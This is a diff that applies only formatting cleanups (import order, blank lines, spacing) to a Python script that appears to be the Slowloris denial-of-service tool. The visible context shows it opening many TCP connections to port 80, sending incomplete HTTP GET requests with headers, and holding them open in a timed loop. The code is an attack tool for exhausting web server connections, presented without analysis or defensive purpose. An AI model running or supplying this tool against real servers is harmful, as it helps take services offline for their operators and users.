@@ -1,13 +1,15 @@
-import socket
 import random
-import time
+import socket
 import sys
+import time
 
 log_level = 2
+
 
 def log(text, level=1):
     if log_level >= level:
         print(text)
+
 
 list_of_sockets = []
 
@@ -16,15 +18,17 @@ regular_headers = [
     "Accept-language: en-US,en,q=0.5"
 ]
 
+
 def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
-    s.connect((ip,80))
+    s.connect((ip, 80))
 
     s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
     for header in regular_headers:
         s.send("{}\r\n".format(header).encode("utf-8"))
     return s
+
 
 def is_number(s):
     try:
@@ -32,6 +36,7 @@ def is_number(s):
         return True
     except ValueError:
         return False
+
 
 def main():
     if len(sys.argv) < 2 or len(sys.argv) > 3:
@@ -68,6 +73,7 @@ def main():
             except socket.error:
                 break
         time.sleep(15)
+
 
 if __name__ == "__main__":
     main()
